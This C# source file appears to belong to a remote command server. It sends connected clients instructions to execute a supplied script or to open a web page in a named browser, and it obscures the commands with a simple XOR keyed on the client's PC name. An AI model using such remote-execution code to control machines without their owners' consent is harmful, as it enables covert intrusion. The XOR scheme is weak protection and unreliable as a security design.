using CSharpExtendedCommands.Data.Cryptography;
using CSharpExtendedCommands.Data.SimpleJSON;
using CSharpExtendedCommands.DataTypeExtensions.Json;
using CSharpExtendedCommands.Web.Communication;

namespace CommanderServer.Commands
{
    public static class Commands
    {
        public static TCPClient Get(ClientInfo client)
        {
            return (TCPClient)Server.GetClient<TCPClient>(client);
        }
        //public static void Execute_C_Script(ClientInfo client)
        //{

        //}
        public static object[] Parameters;
        internal static TcpPackage GeneratePackage(JSONNode json, ClientInfo client)
        {
            var str = json.ToString();
            return new XORAlgorithm().Encrypt(str, client.ClientPCName);
        }
        public static void Execute_C_Script(ClientInfo client)
        {
            JSONNode json = JSON.Empty;
            JSONNode parameters = JSON.Empty;
            json.AddTuple("ExecuteMethod", "ExecuteScript");
            Get(client).SendPackage(GeneratePackage(json, client));
            Get(client).SendPackage(Parameters[0].ToString());
        }
        public static void Open_Web_Page(ClientInfo client)
        {
            JSONNode json = JSON.Empty;
            JSONNode parameters = JSON.Empty;
            parameters.AddTuple("PageUrl", Parameters[0].ToString());
            parameters.AddTuple("Navigator", Parameters[1].ToString());
            json.AddTuple("ExecuteMethod", "OpenWebPage");
            json.Add("Parameters", parameters);
            Get(client).SendPackage(GeneratePackage(json, client));
        }
    }

}
